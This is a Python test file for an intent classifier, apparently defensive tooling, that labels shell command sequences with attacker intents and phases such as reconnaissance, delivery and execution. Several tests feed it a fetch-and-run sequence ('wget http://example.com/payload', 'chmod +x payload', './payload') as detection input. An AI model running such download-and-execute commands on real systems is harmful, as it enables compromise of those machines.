from intelligence.intent.classifier import IntentClassifier


def test_discovery_intent():
    classifier = IntentClassifier()

    results = classifier.classify(
        ["whoami", "uname -a", "hostname"]
    )

    intents = {result.intent for result in results}

    assert "discovery" in intents


def test_file_discovery_intent():
    classifier = IntentClassifier()

    results = classifier.classify(
        ["ls", "pwd", "find /tmp"]
    )

    intents = {result.intent for result in results}

    assert "file_discovery" in intents


def test_payload_retrieval_intent():
    classifier = IntentClassifier()

    results = classifier.classify(
        ["wget http://example.com/payload"]
    )

    intents = {result.intent for result in results}

    assert "payload_retrieval" in intents


def test_execution_intent():
    classifier = IntentClassifier()

    results = classifier.classify(
        ["chmod +x payload", "./payload"]
    )

    intents = {result.intent for result in results}

    assert "execution" in intents


def test_empty_commands_return_no_intent():
    classifier = IntentClassifier()

    results = classifier.classify([])

    assert results == []


def test_evidence_is_recorded():
    classifier = IntentClassifier()

    results = classifier.classify(
        ["whoami", "pwd"]
    )

    discovery = next(
        result for result in results
        if result.intent == "discovery"
    )

    file_discovery = next(
        result for result in results
        if result.intent == "file_discovery"
    )

    assert "whoami" in discovery.evidence
    assert "pwd" in file_discovery.evidence


def test_primary_intent_is_highest_confidence():
    classifier = IntentClassifier()

    results = classifier.classify(
        [
            "whoami",
            "uname -a",
            "hostname",
            "ls",
        ]
    )

    assert results[0].intent == "discovery"
    assert results[0].confidence > results[1].confidence


def test_discovery_behavior_has_multiple_evidence_items():
    classifier = IntentClassifier()

    results = classifier.classify(
        [
            "whoami",
            "uname -a",
            "hostname",
        ]
    )

    discovery = next(
        result for result in results
        if result.intent == "discovery"
    )

    assert len(discovery.evidence) == 3


def test_payload_then_execution_shows_both_intents():
    classifier = IntentClassifier()

    results = classifier.classify(
        [
            "wget http://example.com/payload",
            "chmod +x payload",
            "./payload",
        ]
    )

    intents = {result.intent for result in results}

    assert "payload_retrieval" in intents
    assert "execution" in intents


def test_discovery_intent_has_reconnaissance_phase():
    classifier = IntentClassifier()

    results = classifier.classify(
        ["whoami", "uname -a"]
    )

    discovery = next(
        result for result in results
        if result.intent == "discovery"
    )

    assert discovery.phase == "reconnaissance"


def test_file_discovery_intent_has_reconnaissance_phase():
    classifier = IntentClassifier()

    results = classifier.classify(
        ["ls", "pwd"]
    )

    file_discovery = next(
        result for result in results
        if result.intent == "file_discovery"
    )

    assert file_discovery.phase == "reconnaissance"


def test_payload_retrieval_has_delivery_phase():
    classifier = IntentClassifier()

    results = classifier.classify(
        ["wget http://example.com/payload"]
    )

    payload = next(
        result for result in results
        if result.intent == "payload_retrieval"
    )

    assert payload.phase == "delivery"


def test_execution_has_execution_phase():
    classifier = IntentClassifier()

    results = classifier.classify(
        ["chmod +x payload", "./payload"]
    )

    execution = next(
        result for result in results
        if result.intent == "execution"
    )

    assert execution.phase == "execution"
